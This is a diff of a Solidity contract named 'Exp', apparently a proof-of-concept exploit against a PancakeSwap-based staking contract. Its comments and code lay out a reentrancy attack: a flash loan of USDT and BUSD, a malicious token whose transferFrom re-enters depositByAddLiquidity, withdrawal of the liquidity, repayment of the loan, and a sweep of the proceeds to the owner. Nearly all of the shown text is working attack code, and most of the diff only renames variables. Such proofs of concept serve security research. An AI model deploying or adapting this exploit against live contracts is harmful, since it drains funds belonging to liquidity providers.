@@ -8,9 +8,11 @@ import "./interfaces/IPancakePair.sol";
 import "hardhat/console.sol";
 
 // 1. Deploy token X, Y
-// 2. DepositByLiquidity by A with token X, Y
-// 3. In the transferFrom of token X, borrow from pancake and then call DepositByLiquidity
-// 4. A call withdrawAndRemoveLiquidity
+// 2. Flashloan to get usdt and busd and then send to token X
+// 3. Call depositByAddLiquidity with token X, Y
+// 4. In the transferFrom of token X, re-enter depositByAddLiquidity with usdt and busd
+// 5. Withdraw liqudity
+// 6. Repay flashloan
 
 interface IMasterChef {
   struct UserInfo {
@@ -101,7 +103,7 @@ contract Exp is IPancakeCallee {
   uint256 public constant USDT_BUSD_POOL_ID = 18;
   uint256 public constant SUPPLY = 10 ** 18;
 
-  uint256 flashLoanSize;
+  uint256 flashloanSize;
   address badToken;
   address goodToken;
 
@@ -109,14 +111,14 @@ contract Exp is IPancakeCallee {
     owner = msg.sender;
   }
 
-  function prepare(uint256 _flashLoanSize) external {
-    flashLoanSize = _flashLoanSize;
+  function prepare(uint256 _flashloanSize) external {
+    flashloanSize = _flashloanSize;
     goodToken = address(new GoodToken(SUPPLY));
     badToken = address(new BadToken(SUPPLY));
   }
 
   function trigger() external {
-    _flashLoan();
+    _flashloan();
 
   }
 
@@ -169,9 +171,9 @@ contract Exp is IPancakeCallee {
     IERC20(BUSD).transfer(owner, busdBalance);
   }
 
-  function _flashLoan() internal {
-    uint256 amount0Out = flashLoanSize;
-    uint256 amount1Out = flashLoanSize;
+  function _flashloan() internal {
+    uint256 amount0Out = flashloanSize;
+    uint256 amount1Out = flashloanSize;
     IPancakePair(USDT_BUSD_PAIR).swap(
       amount0Out,
       amount1Out,
@@ -181,7 +183,7 @@ contract Exp is IPancakeCallee {
   }
 
   function _repayFlashLoan() internal {
-    uint256 repayAmount = flashLoanSize * 1003 / 1000;
+    uint256 repayAmount = flashloanSize * 1003 / 1000;
     IERC20(USDT).transfer(USDT_BUSD_PAIR, repayAmount);
     IERC20(BUSD).transfer(USDT_BUSD_PAIR, repayAmount);
   }
